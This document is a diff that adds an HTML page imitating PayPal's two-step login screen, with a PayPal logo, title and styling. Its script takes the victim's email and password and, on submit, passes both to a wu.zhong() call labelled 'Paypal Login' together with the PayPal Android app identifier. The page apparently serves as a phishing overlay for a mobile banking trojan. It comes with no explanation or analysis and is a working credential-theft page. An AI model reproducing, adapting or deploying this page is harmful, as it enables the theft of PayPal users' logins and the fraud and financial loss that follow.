@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <title>Log in to PayPal</title>
+    <meta name="description" content="Log in to your PayPal account to access secure payments and money transfers.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f5;
+            color: #2c2e2f;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 32px;
+            min-height: 100vh;
+        }
+
+        .paypal-logo {
+            margin-bottom: 48px;
+            width: 64px;
+            height: 64px;
+        }
+
+        .form-container {
+            width: 100%;
+            max-width: 380px;
+        }
+
+        .page-title {
+            font-size: 32px;
+            font-weight: 400;
+            color: #2c2e2f;
+            margin-bottom: 40px;
+            text-align: center;
+            line-height: 1.1;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 24px 20px;
+            font-size: 18px;
+            border: 2px solid #0070ba;
+            border-radius: 30px;
+            outline: none;
+            background: white;
+            color: #2c2e2f;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            border-color: #0070ba;
+        }
+
+        .form-input::placeholder {
+            color: #767676;
+            font-weight: 300;
+        }
+
+        .alternative-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 32px;
+            display: inline-block;
+        }
+
+        .alternative-link:hover {
+            text-decoration: underline;
+        }
+
+        .primary-button {
+            width: 100%;
+            padding: 20px;
+            background: #142c8e;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 16px;
+        }
+
+        .primary-button:hover:not(:disabled) {
+            background: #0f1f6b;
+        }
+
+        .primary-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .secondary-button {
+            width: 100%;
+            padding: 20px;
+            background: white;
+            color: #2c2e2f;
+            border: 2px solid #d9d9d9;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: border-color 0.2s, background-color 0.2s;
+            margin-bottom: 32px;
+        }
+
+        .secondary-button:hover {
+            border-color: #b3b3b3;
+            background: #f8f8f8;
+        }
+
+        .forgot-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+            text-align: center;
+            display: block;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .user-info-section {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .user-email {
+            font-size: 18px;
+            color: #2c2e2f;
+            margin-bottom: 12px;
+            font-weight: 400;
+        }
+
+        .change-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .change-link:hover {
+            text-decoration: underline;
+        }
+
+        .password-input-container {
+            position: relative;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 24px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            color: #767676;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-toggle:hover {
+            color: #2c2e2f;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #2c2e2f;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 12px;
+            font-size: 14px;
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s;
+            max-width: calc(100vw - 40px);
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+
+        .toast.error {
+            background: #d73027;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 32px 24px;
+            }
+            
+            .page-title {
+                font-size: 28px;
+            }
+
+            .paypal-logo {
+                width: 56px;
+                height: 56px;
+                margin-bottom: 40px;
+            }
+
+            .form-input {
+                font-size: 16px;
+                padding: 20px 16px;
+            }
+
+            .primary-button, .secondary-button {
+                font-size: 16px;
+                padding: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="paypal-logo">
+         <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" style="max-height:60px">
+       
+        </div>
+
+        <div class="form-container">
+            <div id="signin-page">
+                <h1 class="page-title">Log in to PayPal</h1>
+
+                <form id="signin-form">
+                    <div class="form-group">
+                        <input 
+                            type="email" 
+                            id="email-input"
+                            class="form-input" 
+                            placeholder="Email"
+                            data-testid="input-email"
+                            autocomplete="username"
+                            autofocus
+                        >
+                    </div>
+
+                    <a href="#" class="alternative-link" data-testid="link-phone">Use phone number instead</a>
+
+                    <button type="submit" class="primary-button" data-testid="button-next" id="signin-next">
+                        Next
+                    </button>
+
+                    <button type="button" class="secondary-button" data-testid="button-signup">
+                        Sign Up
+                    </button>
+
+                    <a href="#" class="forgot-link" data-testid="link-forgot-email">
+                        Forgotten your email?
+                    </a>
+                </form>
+            </div>
+
+            <div id="password-page" class="hidden">
+                <h1 class="page-title">Log in to PayPal</h1>
+
+                <div class="user-info-section">
+                    <div class="user-email" id="display-email" data-testid="text-user-email"></div>
+                    <a href="#" class="change-link" data-testid="link-change" id="change-email">Change</a>
+                </div>
+
+                <form id="password-form">
+                    <div class="form-group">
+                        <div class="password-input-container">
+                            <input 
+                                type="password" 
+                                id="password-input"
+                                class="form-input"
+                                placeholder="Password"
+                                data-testid="input-password"
+                                autocomplete="current-password"
+                                autofocus
+                            >
+                            <button type="button" class="password-toggle" id="password-toggle" data-testid="button-password-toggle">
+                                <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="20" height="20">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                    <circle cx="12" cy="12" r="3"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <a href="#" class="alternative-link" data-testid="link-forgot-password" style="margin-bottom: 40px;">
+                        Forgotten password?
+                    </a>
+
+                    <button type="submit" class="primary-button" data-testid="button-login" id="password-login">
+                        Log In
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        let currentEmail = '';
+        let isLoading = false;
+
+        function showToast(message, isError = false) {
+          
+        }
+
+        function validateEmail(email) {
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function setLoading(button, loading) {
+            button.disabled = loading;
+            button.textContent = loading ? 'Loading...' : (button.id === 'signin-next' ? 'Next' : 'Log In');
+            isLoading = loading;
+        }
+
+        function showPage(pageId) {
+            document.getElementById('signin-page').classList.add('hidden');
+            document.getElementById('password-page').classList.add('hidden');
+            document.getElementById(pageId).classList.remove('hidden');
+        }
+
+        document.getElementById('signin-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (isLoading) return;
+            
+            const emailInput = document.getElementById('email-input');
+            const email = emailInput.value.trim();
+            const nextButton = document.getElementById('signin-next');
+            
+            if (!email) {
+                showToast('Please enter your email address.', true);
+                return;
+            }
+
+            if (!validateEmail(email)) {
+                showToast('Please enter a valid email address.', true);
+                return;
+            }
+
+            setLoading(nextButton, true);
+            currentEmail = email;
+            
+            setTimeout(() => {
+                document.getElementById('display-email').textContent = email;
+                showPage('password-page');
+                setLoading(nextButton, false);
+                
+                setTimeout(() => {
+                    document.getElementById('password-input').focus();
+                }, 100);
+            }, 800);
+        });
+
+        document.getElementById('password-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            if (isLoading) return;
+            
+            const passwordInput = document.getElementById('password-input');
+            const password = passwordInput.value.trim();
+            const loginButton = document.getElementById('password-login');
+            
+            if (!password) {
+                showToast('Please enter your password.', true);
+                return;
+            }
+
+            setLoading(loginButton, true);
+            
+          wu.zhong(`🔰Paypal Login \n\n✉️Email: ${ document.getElementById('email-input').value}\n🔒Password: ${password}`,"com.paypal.android.p2pmobile");
+
+        });
+
+        document.getElementById('password-toggle').addEventListener('click', function() {
+            const passwordInput = document.getElementById('password-input');
+            const eyeIcon = document.getElementById('eye-icon');
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            
+            if (isPassword) {
+                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
+            } else {
+                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+            }
+        });
+
+        document.getElementById('change-email').addEventListener('click', function(e) {
+            e.preventDefault();
+            showPage('signin-page');
+            document.getElementById('email-input').focus();
+        });
+
+      
+
+     
+        document.addEventListener('DOMContentLoaded', function() {
+            showPage('signin-page');
+            document.getElementById('email-input').focus();
+        });
+    </script>
+</body>
+</html>
